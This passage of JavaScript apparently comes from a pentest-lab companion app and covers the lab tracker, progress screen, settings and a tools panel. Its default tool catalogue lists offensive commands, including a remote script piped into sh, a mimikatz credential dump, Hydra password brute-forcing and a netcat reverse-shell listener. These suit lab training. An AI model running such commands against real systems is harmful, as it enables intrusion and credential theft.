  const searchEl = $('#tracker-search');
  if (searchEl && !searchEl._wired) {
    searchEl._wired = true;
    searchEl.addEventListener('input', () => renderTrackerScreen(searchEl.value.trim()));
  }

  // ── Platform + Difficulty filters ─────────────────────────────────────────────
  const platFilter = $('#tracker-filter-platform');
  const diffFilter = $('#tracker-filter-difficulty');
  if (platFilter && !platFilter._wired) {
    platFilter._wired = true;
    platFilter.addEventListener('change', () => renderTrackerScreen($('#tracker-search')?.value?.trim() || ''));
  }
  if (diffFilter && !diffFilter._wired) {
    diffFilter._wired = true;
    diffFilter.addEventListener('change', () => renderTrackerScreen($('#tracker-search')?.value?.trim() || ''));
  }

  renderTrackerScreen();
}

function refreshTrackerScreen() {
  renderTrackerScreen();
}

function renderTrackerScreen(searchQ = '') {
  const q = (searchQ || ($('#tracker-search')?.value || '')).toLowerCase().trim();
  const platFilter = ($('#tracker-filter-platform')?.value || '').toLowerCase();
  const diffFilter = ($('#tracker-filter-difficulty')?.value || '').toLowerCase();

  Object.values(AppState.labsData.columns).forEach(col => {
    // Apply filters to a copy of the column so state is unaffected
    if (q || platFilter || diffFilter) {
      const filtered = {
        ...col,
        cards: col.cards.filter(c => {
          const matchQ = !q || (c.name||'').toLowerCase().includes(q) || (c.notes||'').toLowerCase().includes(q);
          const matchPlat = !platFilter || (c.platform||'').toLowerCase() === platFilter;
          const matchDiff = !diffFilter || (c.difficulty||'').toLowerCase() === diffFilter;
          return matchQ && matchPlat && matchDiff;
        })
      };
      renderKanbanColumn(filtered);
    } else {
      renderKanbanColumn(col);
    }
  });

  // Populate platform filter options from existing cards (once)
  const platEl = $('#tracker-filter-platform');
  if (platEl && platEl.options.length <= 1) {
    const platforms = [...new Set(
      Object.values(AppState.labsData.columns).flatMap(c => c.cards.map(card => card.platform)).filter(Boolean)
    )];
    platforms.forEach(p => {
      const opt = document.createElement('option');
      opt.value = p; opt.textContent = p;
      platEl.appendChild(opt);
    });
  }
}

function renderKanbanColumn(col) {
  const container = $(`#kanban-col-${col.id}`);
  if (!container) return;

  const cardsEl = container.querySelector('.kanban-cards');
  const countEl = container.querySelector('.kanban-count');

  if (countEl) countEl.textContent = col.cards.length;

  if (!cardsEl) return;
  cardsEl.innerHTML = '';

  col.cards.forEach(card => {
    const el = createKanbanCard(card, col.id);
    cardsEl.appendChild(el);
  });

  // Drop zone
  cardsEl.addEventListener('dragover', (e) => { e.preventDefault(); cardsEl.classList.add('drag-over'); });
  cardsEl.addEventListener('dragleave', () => cardsEl.classList.remove('drag-over'));
  cardsEl.addEventListener('drop', (e) => {
    e.preventDefault();
    cardsEl.classList.remove('drag-over');
    const { cardId, sourceCol } = AppState.dragState;
    if (cardId && sourceCol && sourceCol !== col.id) {
      labMoveCard(cardId, sourceCol, col.id);
    }
  });
}

function createKanbanCard(card, colId) {
  const el = document.createElement('div');
  el.className = 'kanban-card';
  el.draggable = true;
  el.dataset.cardId = card.id;
  el.dataset.colId = colId;

  const diffColors = { Easy: '#3fb950', Medium: '#d29922', Hard: '#f85149', Insane: '#a371f7' };
  const dotColor = diffColors[card.difficulty] || '#888';

  el.innerHTML = `
    <div class="kanban-card-header">
      <span class="kanban-card-dot" style="background:${dotColor}"></span>
      <span class="kanban-card-name">${escHtml(card.name)}</span>
    </div>
    <div class="kanban-card-meta">
      ${card.platform ? `<span class="kanban-card-platform">${escHtml(card.platform)}</span>` : ''}
      ${card.difficulty ? `<span class="kanban-card-diff">${escHtml(card.difficulty)}</span>` : ''}
      ${card.ip ? `<span class="kanban-card-ip">${escHtml(card.ip)}</span>` : ''}
    </div>
    ${card.notes ? `<div class="kanban-card-notes">${escHtml(card.notes.slice(0, 80))}${card.notes.length > 80 ? '…' : ''}</div>` : ''}
  `;

  el.addEventListener('click', () => openLabModal(card.id, colId));
  el.addEventListener('dragstart', (e) => {
    AppState.dragState = { cardId: card.id, sourceCol: colId };
    el.classList.add('dragging');
    e.dataTransfer.effectAllowed = 'move';
  });
  el.addEventListener('dragend', () => {
    el.classList.remove('dragging');
    AppState.dragState = { cardId: null, sourceCol: null };
  });

  return el;
}

function labMoveCard(cardId, fromColId, toColId) {
  const fromCol = AppState.labsData.columns[fromColId];
  const toCol = AppState.labsData.columns[toColId];
  if (!fromCol || !toCol) return;

  const idx = fromCol.cards.findIndex(c => c.id === cardId);
  if (idx === -1) return;

  const [card] = fromCol.cards.splice(idx, 1);
  card.movedAt = Date.now();
  if (toColId === 'completed') card.completedAt = Date.now();
  toCol.cards.push(card);

  saveLabTrackerData();
  renderTrackerScreen();
  if (toColId === 'completed' && AppState.config.soundEnabled) Sounds.sessionComplete();
}

function showAddLabCardModal(colId) {
  // Reuse lab-modal in create mode
  const modal = $('#lab-modal');
  if (!modal) return;

  modal.dataset.cardId = '';
  modal.dataset.cardCol = colId;

  // Clear fields
  ['#lab-name-input', '#lab-notes-input', '#lab-modal-os', '#lab-url-input'].forEach(sel => {
    const el = modal.querySelector(sel);
    if (el) el.value = '';
  });
  const notesArea = modal.querySelector('#lab-notes-input');
  if (notesArea) notesArea.value = '';

  const saveBtn = modal.querySelector('#save-lab-confirm');
  if (saveBtn) {
    // Override save for create mode
    saveBtn.onclick = () => {
      const name = (modal.querySelector('#lab-name-input')?.value || '').trim();
      if (!name) { showToast('Enter a lab name', 'warning'); return; }

      const card = {
        id: generateId(),
        name,
        platform: modal.querySelector('#lab-platform-input')?.value || 'HTB',
        difficulty: modal.querySelector('#lab-difficulty-input')?.value || 'Medium',
        ip: modal.querySelector('#lab-notes-input')?.value?.trim() || '',
        os: modal.querySelector('#lab-modal-os')?.value?.trim() || '',
        notes: modal.querySelector('#lab-notes-input')?.value || '',
        url: modal.querySelector('#lab-url-input')?.value?.trim() || '',
        createdAt: Date.now(),
      };

      AppState.labsData.columns[colId].cards.push(card);
      saveLabTrackerData();
      renderTrackerScreen();
      hideModal('lab-modal');
      showToast('Lab added', 'success', 1500);

      // Restore original save handler
      if (saveBtn) saveBtn.onclick = null;
    };
  }

  showModal('lab-modal');
}

// =============================================================================
// SECTION 3J — PROGRESS SCREEN
// =============================================================================

function wireProgressScreen() {
  const progressBack = $('#progress-back-btn');
  if (progressBack && !progressBack._wired) {
    progressBack._wired = true;
    progressBack.addEventListener('click', () => switchScreen('dashboard'));
  }

  // Analyse My Progress button
  const analyseBtn = $('#analyse-weakness-btn');
  if (analyseBtn && !analyseBtn._wired) {
    analyseBtn._wired = true;
    analyseBtn.addEventListener('click', async () => {
      const resultEl = $('#weakness-result');
      const lastRunEl = $('#weakness-last-run');
      if (resultEl) {
        resultEl.style.display = '';
        resultEl.innerHTML = '<div style="color:var(--text-muted);font-size:12px;padding:8px">Analysing your progress…</div>';
      }
      // Build a summary of skills and sessions to send to AI
      const stats = AppState.progressData?.stats || {};
      const sessions = AppState.tabs.filter(t => t.session).length;
      const prompt = `I am a pentester using CyberLab Companion. I have completed ${sessions} session(s).
My progress stats: ${JSON.stringify(stats, null, 2)}

Based on this, please:
1. Identify my weakest areas and skill gaps
2. Suggest 3-5 specific areas I should practice next
3. Recommend HTB machines or TryHackMe rooms that match my current level
4. Give me one actionable training tip

Keep the response concise and practical.`;

      try {
        sendChatMessage(prompt);
        if (resultEl) {
          resultEl.innerHTML = '<div style="color:var(--success);font-size:12px;padding:8px">✓ Analysis sent to AI Chat — switch to Chat to read the response.</div>';
        }
        if (lastRunEl) lastRunEl.textContent = `Last run: ${new Date().toLocaleTimeString()}`;
        showToast('Progress analysis sent to AI', 'info');
        setTimeout(() => switchScreen('lab'), 1200);
      } catch (e) {
        if (resultEl) resultEl.innerHTML = `<div style="color:var(--error);font-size:12px;padding:8px">Error: ${escHtml(e.message)}</div>`;
      }
    });
  }

  // Filter tabs
  $$('.progress-filter-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      $$('.progress-filter-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      renderAchievements(btn.dataset.filter || 'all');
    });
  });
}

function refreshProgressScreen() {
  const stats = computeProgressStats(AppState.progressData);
  renderStatsCards(stats);
  renderSkillTree();
  renderAchievements('all');
  renderProgressCharts(stats);
}

function renderStatsCards(stats) {
  const cards = {
    '#stat-labs-pwned': stats.labsPwned || 0,
    '#stat-flags-captured': stats.flags || 0,
    '#stat-total-xp': stats.totalXP || 0,
    '#stat-current-streak': stats.streak || 0,
    '#stat-findings': stats.findings || 0,
    '#stat-sessions': stats.sessions || 0,
  };
  Object.entries(cards).forEach(([sel, val]) => {
    const el = $(sel);
    if (el) el.textContent = val;
  });
}

function renderSkillTree() {
  const container = $('#skill-tree-grid');
  if (!container) return;

  container.innerHTML = '';
  SKILL_TREE.forEach(domain => {
    const domainEl = document.createElement('div');
    domainEl.className = 'skill-domain';

    const unlocked = (AppState.progressData.skillTree?.[domain.id] || []);
    const total = domain.nodes.length;
    const progress = total > 0 ? Math.round((unlocked.length / total) * 100) : 0;

    domainEl.innerHTML = `
      <div class="skill-domain-header">
        <span class="skill-domain-icon">${domain.icon || '⚙️'}</span>
        <span class="skill-domain-name">${escHtml(domain.name)}</span>
        <span class="skill-domain-progress">${unlocked.length}/${total}</span>
      </div>
      <div class="skill-progress-bar"><div class="skill-progress-fill" style="width:${progress}%"></div></div>
      <div class="skill-nodes">
        ${domain.nodes.map(node => {
          const isUnlocked = unlocked.includes(node.id);
          return `
            <div class="skill-node ${isUnlocked ? 'unlocked' : 'locked'}" title="${escHtml(node.description || node.name)}">
              <span class="skill-node-icon">${isUnlocked ? (node.icon || '✓') : '🔒'}</span>
              <span class="skill-node-name">${escHtml(node.name)}</span>
            </div>
          `;
        }).join('')}
      </div>
    `;

    container.appendChild(domainEl);
  });
}

function renderAchievements(filter) {
  const container = $('#achievements-grid');
  if (!container) return;

  const unlocked = AppState.progressData.achievements || [];
  const filtered = ACHIEVEMENTS.filter(a => {
    if (filter === 'unlocked') return unlocked.includes(a.id);
    if (filter === 'locked') return !unlocked.includes(a.id);
    return true;
  });

  container.innerHTML = filtered.map(a => {
    const isUnlocked = unlocked.includes(a.id);
    return `
      <div class="achievement-card ${isUnlocked ? 'unlocked' : 'locked'}">
        <div class="achievement-icon">${a.icon || '🏆'}</div>
        <div class="achievement-name">${escHtml(a.name)}</div>
        <div class="achievement-desc">${escHtml(a.description)}</div>
        ${isUnlocked ? '<div class="achievement-badge">UNLOCKED</div>' : '<div class="achievement-badge locked">LOCKED</div>'}
      </div>
    `;
  }).join('') || '<div class="achievements-empty">No achievements in this filter</div>';
}

function renderProgressCharts(stats) {
  // Skill Radar Chart
  const radarCanvas = $('#chart-skills');
  if (radarCanvas && typeof Chart !== 'undefined') {
    if (AppState.charts.radar) AppState.charts.radar.destroy();
    const domains = SKILL_TREE.map(d => d.name);
    const unlocked = SKILL_TREE.map(d => {
      const u = AppState.progressData.skillTree?.[d.id]?.length || 0;
      const t = d.nodes.length || 1;
      return Math.round((u / t) * 100);
    });
    AppState.charts.radar = new Chart(radarCanvas, {
      type: 'radar',
      data: {
        labels: domains,
        datasets: [{
          label: 'Skill Level',
          data: unlocked,
          backgroundColor: 'rgba(74,158,255,0.2)',
          borderColor: getComputedStyle(document.documentElement).getPropertyValue('--accent').trim() || '#4a9eff',
          pointBackgroundColor: getComputedStyle(document.documentElement).getPropertyValue('--accent').trim() || '#4a9eff',
        }]
      },
      options: {
        scales: { r: { min: 0, max: 100, ticks: { display: false }, grid: { color: 'rgba(255,255,255,0.1)' } } },
        plugins: { legend: { display: false } },
        elements: { point: { radius: 4 } }
      }
    });
  }

  // Activity chart (simple bar — sessions per day last 14 days)
  const activityCanvas = $('#chart-time');
  if (activityCanvas && typeof Chart !== 'undefined') {
    if (AppState.charts.activity) AppState.charts.activity.destroy();
    const labels = [];
    const data = [];
    for (let i = 13; i >= 0; i--) {
      const d = new Date();
      d.setDate(d.getDate() - i);
      labels.push(d.toLocaleDateString(undefined, { month: 'short', day: 'numeric' }));
      data.push(stats.activityByDay?.[d.toDateString()] || 0);
    }
    AppState.charts.activity = new Chart(activityCanvas, {
      type: 'bar',
      data: {
        labels,
        datasets: [{
          label: 'Sessions',
          data,
          backgroundColor: getComputedStyle(document.documentElement).getPropertyValue('--accent').trim() || '#4a9eff',
          borderRadius: 4,
        }]
      },
      options: {
        scales: {
          x: { grid: { display: false }, ticks: { color: 'rgba(255,255,255,0.5)', font: { size: 10 } } },
          y: { beginAtZero: true, grid: { color: 'rgba(255,255,255,0.05)' }, ticks: { color: 'rgba(255,255,255,0.5)' } }
        },
        plugins: { legend: { display: false } }
      }
    });
  }
}

// =============================================================================
// SECTION 3K — SETTINGS SCREEN
// =============================================================================

function wireSettingsScreen() {
  // ── Back button ────────────────────────────────────────────────────────────
  const settingsBack = $('#settings-back-btn');
  if (settingsBack && !settingsBack._wired) { settingsBack._wired = true; settingsBack.addEventListener('click', () => switchScreen('dashboard')); }

  // ── Two-layer theme picker ─────────────────────────────────────────────────
  initSettingsThemePicker();

  // API Key
  const apiKeyInput = $('#settings-apikey');
  const apiKeySaveBtn = $('#settings-save-api');
  const apiKeyTestBtn = $('#settings-test-api');
  const apiKeyStatus = $('#settings-api-result');

  if (apiKeyInput) {
    // Show masked existing key
    window.electronAPI.hasApiKey().then(has => {
      if (has) apiKeyInput.placeholder = '••••••••••••••••••••••••••••••••';
    });
  }

  if (apiKeySaveBtn) {
    apiKeySaveBtn.addEventListener('click', async () => {
      const key = (apiKeyInput?.value || '').trim();
      if (!key) { showToast('Enter an API key', 'warning'); return; }
      setButtonLoading(apiKeySaveBtn, true, 'Saving…');
      try {
        await window.electronAPI.saveApiKey(key);
        showToast('API key saved', 'success');
        if (apiKeyInput) apiKeyInput.value = '';
        if (apiKeyStatus) { apiKeyStatus.textContent = 'Saved'; apiKeyStatus.style.color = 'var(--success)'; }
      } catch (e) {
        showToast('Save failed: ' + e.message, 'error');
      }
      setButtonLoading(apiKeySaveBtn, false);
    });
  }

  if (apiKeyTestBtn) {
    apiKeyTestBtn.addEventListener('click', async () => {
      const key = (apiKeyInput?.value || '').trim();
      setButtonLoading(apiKeyTestBtn, true, 'Testing…');
      try {
        const ok = await window.electronAPI.testApiKey(key || undefined);
        const valid = !!ok;
        updateApiStatusDot(valid);
        if (apiKeyStatus) {
          apiKeyStatus.textContent = valid ? '✓ Connected' : '✗ Invalid';
          apiKeyStatus.style.color = valid ? 'var(--success)' : 'var(--danger)';
        }
        showToast(valid ? 'API key is valid!' : 'API key is invalid', valid ? 'success' : 'error');
      } catch (e) {
        showToast('Test failed: ' + e.message, 'error');
      }
      setButtonLoading(apiKeyTestBtn, false);
    });
  }

  // Obsidian Vault
  const obsidianInput = $('#settings-vault');
  const obsidianPickBtn = $('#settings-browse-vault');
  const obsidianSaveBtn = $('#save-obsidian-btn');
  const obsidianScanBtn = $('#settings-open-vault');

  if (obsidianInput && AppState.config.obsidianVault) {
    obsidianInput.value = AppState.config.obsidianVault;
  }

  if (obsidianPickBtn) {
    obsidianPickBtn.addEventListener('click', async () => {
      const dir = await window.electronAPI.pickFolder();
      if (dir) {
        if (obsidianInput) obsidianInput.value = dir;
        AppState.config.obsidianVault = dir;
      }
    });
  }

  if (obsidianSaveBtn) {
    obsidianSaveBtn.addEventListener('click', async () => {
      AppState.config.obsidianVault = obsidianInput?.value?.trim() || '';
      await window.electronAPI.saveConfig(AppState.config);
      showToast('Obsidian path saved', 'success', 1500);
    });
  }

  if (obsidianScanBtn) {
    obsidianScanBtn.addEventListener('click', async () => {
      if (!AppState.config.obsidianVault) { showToast('Set an Obsidian vault path first', 'warning'); return; }
      setButtonLoading(obsidianScanBtn, true, 'Scanning…');
      try {
        const notes = await window.electronAPI.scanVault(AppState.config.obsidianVault);
        showToast(`Found ${notes.length} notes in vault`, 'success');
      } catch (e) {
        showToast('Scan failed: ' + e.message, 'error');
      }
      setButtonLoading(obsidianScanBtn, false);
    });
  }

  // Theme — handled by initSettingsThemePicker() above

  // Font size
  const fontSel = $('#default-timer');
  if (fontSel) {
    fontSel.value = AppState.config.fontSize || 'medium';
    fontSel.addEventListener('change', async () => {
      AppState.config.fontSize = fontSel.value;
      applyFontSize(fontSel.value);
      await window.electronAPI.saveConfig(AppState.config);
    });
  }

  // HTB / THM integration fields
  const htbKeyInput  = $('#settings-htb-key');
  const thmUserInput = $('#settings-thm-user');
  const htbSaveBtn   = $('#settings-save-htb-thm');

  if (htbKeyInput)  htbKeyInput.value  = AppState.config.htbApiKey  || '';
  if (thmUserInput) thmUserInput.value = AppState.config.thmUsername || '';

  if (htbSaveBtn && !htbSaveBtn._wired) {
    htbSaveBtn._wired = true;
    htbSaveBtn.addEventListener('click', async () => {
      if (htbKeyInput)  AppState.config.htbApiKey   = htbKeyInput.value.trim();
      if (thmUserInput) AppState.config.thmUsername  = thmUserInput.value.trim();
      await window.electronAPI.saveConfig(AppState.config);
      showToast('HTB / THM settings saved', 'success', 1500);
    });
  }

  // Toggles
  const toggleMap = {
    '#sounds-toggle': 'soundEnabled',
    '#autosave-interval': 'autosaveEnabled',
    '#update-check-toggle': 'vpnCheckEnabled',
    '#notif-placeholder': 'notificationsEnabled',
  };
  Object.entries(toggleMap).forEach(([sel, key]) => {
    const el = $(sel);
    if (!el) return;
    el.checked = !!AppState.config[key];
    el.addEventListener('change', async () => {
      AppState.config[key] = el.checked;
      await window.electronAPI.saveConfig(AppState.config);
      if (key === 'vpnCheckEnabled') {
        if (el.checked) startVpnMonitor();
        else { clearInterval(AppState.vpnInterval); AppState.vpnInterval = null; }
      }
    });
  });

  // Version info
  const versionEl = $('#update-version');
  if (versionEl) {
    window.electronAPI.getVersion().then(v => { if (versionEl) versionEl.textContent = `v${v}`; }).catch(() => {});
  }

  // Check for updates button
  const checkUpdateBtn = $('#open-github-btn');
  if (checkUpdateBtn) {
    checkUpdateBtn.addEventListener('click', async () => {
      setButtonLoading(checkUpdateBtn, true, 'Checking…');
      try {
        const hasUpdate = await window.electronAPI.checkUpdate();
        if (hasUpdate) {
          AppState.updateAvailable = true;
          checkUpdateBanner();
          showToast('Update available! See banner above.', 'success', 4000);
        } else {
          showToast('You are on the latest version', 'info');
        }
      } catch (e) {
        showToast('Update check failed', 'error');
      }
      setButtonLoading(checkUpdateBtn, false);
    });
  }

  // Clear data
  const clearProgressBtn = $('#factory-reset-btn');
  if (clearProgressBtn) {
    clearProgressBtn.addEventListener('click', () => {
      showConfirm('Clear all progress data? This cannot be undone.', async (ok) => {
        if (!ok) return;
        AppState.progressData = { skillTree: {}, achievements: [], totalXP: 0, stats: {} };
        await saveProgressData();
        showToast('Progress cleared', 'info');
      });
    });
  }

  // Export sessions
  const exportBtn = $('#export-snippets-btn');
  if (exportBtn) {
    exportBtn.addEventListener('click', async () => {
      try {
        const sessions = await window.electronAPI.listSessions();
        showToast(`${sessions.length} sessions available for export`, 'info');
      } catch (e) {
        showToast('Export failed: ' + e.message, 'error');
      }
    });
  }
}

// =============================================================================
// SECTION 3L — SESSION SESSIONS SCREEN (Load / Restore)
// =============================================================================

async function showSessionsModal() {
  await loadSessionList();
  const modal = $('#sessions-list-modal');
  if (!modal) return;

  const container = modal.querySelector('#sessions-list-content');
  if (container) {
    if (AppState.sessionList.length === 0) {
      container.innerHTML = '<div class="sessions-empty">No saved sessions yet</div>';
    } else {
      container.innerHTML = AppState.sessionList.map(s => `
        <div class="session-list-item" data-id="${s.id}">
          <div class="sli-name">${escHtml(s.name)}</div>
          <div class="sli-meta">
            <span class="sli-platform">${escHtml(s.platform || '')}</span>
            <span class="sli-diff">${escHtml(s.difficulty || '')}</span>
            <span class="sli-date">${formatDate(s.savedAt)}</span>
          </div>
          <div class="sli-actions">
            <button class="sli-load-btn" data-id="${s.id}">Resume</button>
            <button class="sli-del-btn" data-id="${s.id}">Delete</button>
          </div>
        </div>
      `).join('');

      container.querySelectorAll('.sli-load-btn').forEach(btn => {
        btn.addEventListener('click', async () => {
          try {
            const data = await window.electronAPI.loadSession(btn.dataset.id);
            if (data) {
              const { session, chatHistory } = deserializeSession(data);
              createTab(session);
              const tab = getActiveTab();
              if (tab) tab.chatHistory = chatHistory || [];
              renderActiveTab();
              hideModal('sessions-list-modal');
              showToast(`Resumed: ${session.name}`, 'success');
            }
          } catch (e) {
            showToast('Load failed: ' + e.message, 'error');
          }
        });
      });

      container.querySelectorAll('.sli-del-btn').forEach(btn => {
        btn.addEventListener('click', () => {
          showConfirm('Delete this session?', async (ok) => {
            if (!ok) return;
            try {
              await window.electronAPI.deleteSession(btn.dataset.id);
              showToast('Session deleted', 'info', 1500);
              await loadSessionList();
              showSessionsModal();
            } catch (e) {
              showToast('Delete failed: ' + e.message, 'error');
            }
          });
        });
      });
    }
  }

  showModal('sessions-list-modal');
}

// =============================================================================
// SECTION 3M — IPC LISTENERS (Electron → Renderer events)
// =============================================================================

function wireIpcListeners() {
  // Autosave tick (every 60s from main process)
  window.electronAPI.onAutosaveTick(() => {
    if (!AppState.config.autosaveEnabled) return;
    AppState.tabs.forEach(tab => {
      if (tab.chatHistory.length > 0) autoSaveTab(tab);
    });
  });

  // VPN status pushed from main
  window.electronAPI.onVpnStatus((status) => {
    updateVpnIndicator(status);
  });

  // Window focus — refresh UI
  window.electronAPI.onFocusWindow(() => {
    // Refresh session duration display
    const tab = getActiveTab();
    if (tab) renderSessionInfo(tab);
  });

  // Update available
  window.electronAPI.onUpdateAvailable(() => {
    AppState.updateAvailable = true;
    checkUpdateBanner();
    showToast('Update available — click the banner to download', 'info', 6000);
  });
}

// =============================================================================
// SECTION 3N-PRE — V2 LAYOUT WIRING (sidebar, tools, notes, terminal)
// =============================================================================

// Default tool catalogue for the right-panel tools section
const DEFAULT_TOOLS = [
  { id:'nmap',        name:'Nmap',         desc:'Network & port scanner',           cat:'recon',   cmd:'nmap -sV -sC -p- {target}' },
  { id:'gobuster',    name:'Gobuster',     desc:'Directory/DNS brute-forcer',        cat:'recon',   cmd:'gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt' },
  { id:'nikto',       name:'Nikto',        desc:'Web vulnerability scanner',         cat:'recon',   cmd:'nikto -h http://{target}' },
  { id:'whatweb',     name:'WhatWeb',      desc:'Web fingerprinting',                cat:'recon',   cmd:'whatweb http://{target}' },
  { id:'enum4linux',  name:'Enum4linux',   desc:'Windows/Samba enumeration',         cat:'enum',    cmd:'enum4linux -A {target}' },
  { id:'smbclient',   name:'SMBClient',    desc:'SMB share browser',                 cat:'enum',    cmd:'smbclient -L //{target} -N' },
  { id:'ldapsearch',  name:'LDAPSearch',   desc:'LDAP directory enumeration',        cat:'enum',    cmd:'ldapsearch -x -H ldap://{target} -b "dc=domain,dc=local"' },
  { id:'ffuf',        name:'FFUF',         desc:'Web fuzzer (fast)',                  cat:'enum',    cmd:'ffuf -w /usr/share/wordlists/dirb/common.txt -u http://{target}/FUZZ' },
  { id:'sqlmap',      name:'SQLMap',       desc:'SQL injection automation',           cat:'exploit', cmd:'sqlmap -u "http://{target}/page?id=1" --dbs' },
  { id:'metasploit',  name:'Metasploit',   desc:'Exploitation framework console',     cat:'exploit', cmd:'msfconsole' },
  { id:'hydra',       name:'Hydra',        desc:'Network login brute-forcer',         cat:'exploit', cmd:'hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ssh' },
  { id:'searchsploit',name:'Searchsploit', desc:'Exploit DB offline search',          cat:'exploit', cmd:'searchsploit {query}' },
  { id:'linpeas',     name:'LinPEAS',      desc:'Linux privesc enumeration script',   cat:'privesc', cmd:'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
  { id:'winpeas',     name:'WinPEAS',      desc:'Windows privesc enum script',        cat:'privesc', cmd:'winpeas.exe' },
  { id:'sudo-l',      name:'Sudo -l',      desc:'List sudo permissions',              cat:'privesc', cmd:'sudo -l' },
  { id:'suid',        name:'SUID Hunt',    desc:'Find SUID binaries',                 cat:'privesc', cmd:'find / -perm -u=s -type f 2>/dev/null' },
  { id:'mimikatz',    name:'Mimikatz',     desc:'Windows credential dumper',          cat:'post',    cmd:'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit' },
  { id:'bloodhound',  name:'BloodHound',   desc:'AD attack path analysis',            cat:'post',    cmd:'bloodhound-python -u {user} -p {password} -ns {target} -d {domain} -c all' },
  { id:'netcat',      name:'Netcat',       desc:'TCP/UDP utility / reverse shell',    cat:'post',    cmd:'nc -lvnp 4444' },
  { id:'chisel',      name:'Chisel',       desc:'TCP/UDP tunnel over HTTP',           cat:'post',    cmd:'chisel server --reverse --port 8080' },
];

function wireV2Layout() {
  // ── Tool filter tabs — use event delegation to avoid double-bind ─────────────
  const tfilContainer = $('#tools-section') || document.body;
  if (!tfilContainer._tfilWired) {
    tfilContainer._tfilWired = true;
    tfilContainer.addEventListener('click', (e) => {
      const btn = e.target.closest('.tfil');
      if (!btn) return;
      $$('.tfil').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      const search = ($('#tools-search')?.value || '').trim();
      renderToolsPanel(btn.dataset.filter || 'all', search);
    });
  }

  // ── Tools search ─────────────────────────────────────────────────────────────
  const toolSearch = $('#tools-search');
  if (toolSearch && !toolSearch._wired) {
    toolSearch._wired = true;
    toolSearch.addEventListener('input', () => {
      const activeCat = ($$('.tfil').find(b => b.classList.contains('active'))?.dataset.filter) || 'all';
      renderToolsPanel(activeCat, toolSearch.value.trim());
    });
  }

  // ── Manage tools button ───────────────────────────────────────────────────────
  const manageBtn = $('#manage-tools-btn');
  if (manageBtn && !manageBtn._wired) {
    manageBtn._wired = true;
    manageBtn.addEventListener('click', () => showManageToolsModal());
  }

  // ── Notes tabs — event delegation on the notes section ──────────────────────
  // HTML id is "notes-section", fallback to body so delegation always works
  const notesPanel = $('#notes-section') || $('#notes-panel') || document.body;
  if (!notesPanel._notesTabWired) {
    notesPanel._notesTabWired = true;
    notesPanel.addEventListener('click', (e) => {
      const btn = e.target.closest('.notes-tab-btn');
      if (!btn) return;
      $$('.notes-tab-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      renderNotesPanel(getActiveTab(), btn.dataset.notesTab || 'notes');
    });
  }

  // ── New note button ───────────────────────────────────────────────────────────
  const newNoteBtn = $('#new-note-btn');
  if (newNoteBtn) {
    newNoteBtn.addEventListener('click', () => {
      const tab = getActiveTab();
      const note = { id: generateId(), text: '', createdAt: Date.now(), bookmark: false };
      if (tab?.session) {
        // Session active — add to session notes
        tab.session.notesList = tab.session.notesList || [];
        tab.session.notesList.unshift(note);
        renderNotesPanel(tab, 'notes');
        autoSaveTab(tab);
      } else {
        // No session — use global notes store
        AppState.globalNotes = AppState.globalNotes || [];
        AppState.globalNotes.unshift(note);
        renderNotesPanel(null, 'notes');
      }
      const firstTA = $('#notes-list textarea');
      if (firstTA) firstTA.focus();
    });
  }

  // ── View all notes button ─────────────────────────────────────────────────────
  const viewAllBtn = $('#view-all-notes-btn');
  if (viewAllBtn) viewAllBtn.addEventListener('click', () => {
    const tab = getActiveTab();
    $$('.notes-tab-btn').forEach(b => b.classList.toggle('active', b.dataset.notesTab === 'notes'));
    renderNotesPanel(tab, 'notes');
  });

  // ── Terminal section buttons ──────────────────────────────────────────────────
  const termClear = $('#terminal-clear-btn');
  if (termClear) {
    termClear.addEventListener('click', () => {
      const disp = $('#terminal-output-display');
      if (disp) {
        disp.innerHTML = '<div class="terminal-welcome-line"><span class="terminal-prompt">itseliias@lame:~$</span> <span style="color:var(--text-muted)">terminal cleared</span></div>';
      }
    });
  }

  const termExpand = $('#terminal-expand-btn');
  if (termExpand) {
    termExpand.addEventListener('click', () => {
      const section = $('#terminal-section');
      if (section) {
        section.classList.toggle('terminal-expanded');
        termExpand.textContent = section.classList.contains('terminal-expanded') ? '⤡' : '⤢';
      }
    });
  }

  // ── Initial render ────────────────────────────────────────────────────────────
  renderToolsPanel('all');
  renderNotesPanel(getActiveTab(), 'notes');

  // ── Tab switched — refresh notes + status bar ─────────────────────────────────
  document.addEventListener('tabSwitched', () => {
    const tab = getActiveTab();
    renderNotesPanel(tab, 'notes');
    if (typeof updateStatusBar === 'function') updateStatusBar(tab);
    if (typeof updateSidebarProgress === 'function') updateSidebarProgress();
  });
}

// =============================================================================
// SECTION 3O — MANAGE TOOLS MODAL
// =============================================================================

function showManageToolsModal() {
  const modal = $('#manage-tools-modal');
  if (!modal) return;
  renderManageToolsList();
  showModal('manage-tools-modal');

  // Wire add button (guard with _mtWired)
  const addBtn = $('#mt-add-btn');
  if (addBtn && !addBtn._mtWired) {
    addBtn._mtWired = true;
    addBtn.addEventListener('click', () => {
      const name = ($('#mt-name')?.value || '').trim();
      const desc = ($('#mt-desc')?.value || '').trim();
      const cat  = $('#mt-cat')?.value || 'recon';
      const cmd  = ($('#mt-cmd')?.value || '').trim();
      if (!name || !cmd) { showToast('Name and Command are required', 'warning'); return; }
      AppState.customTools = AppState.customTools || [];
      const id = 'custom-' + name.toLowerCase().replace(/\s+/g, '-') + '-' + Date.now();
      AppState.customTools.push({ id, name, desc: desc || name, cat, cmd });
      // Clear inputs
      ['#mt-name','#mt-desc','#mt-cmd'].forEach(sel => { const el = $(sel); if (el) el.value = ''; });
      renderManageToolsList();
      renderToolsPanel(($$('.tfil').find(b => b.classList.contains('active'))?.dataset.filter) || 'all');
      showToast(`"${name}" added to tools`, 'success');
    });
  }
}

function renderManageToolsList() {
  const list = $('#mtool-list');
  if (!list) return;
  const custom = AppState.customTools || [];
  const allTools = [...DEFAULT_TOOLS, ...custom];
  const catColors = { recon:'var(--accent)', enum:'#a371f7', exploit:'var(--danger)', privesc:'var(--warning)', post:'var(--success)' };

  list.innerHTML = allTools.map(tool => {
    const isCustom = custom.some(c => c.id === tool.id);
    return `
    <div class="mtool-row" data-tool-id="${escHtml(tool.id)}">
